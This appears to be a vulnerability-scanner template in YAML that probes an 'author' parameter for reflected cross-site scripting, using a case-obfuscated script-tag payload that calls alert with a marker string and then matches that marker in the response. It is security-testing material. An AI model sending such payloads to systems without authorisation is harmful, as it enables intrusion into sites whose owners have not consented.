id: xss5-0719
name: 'Raw XSS5 in author'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in author'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      author:
        - '<sCrIpT%09>alert(nx50718)</sCrIpT>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx50718'
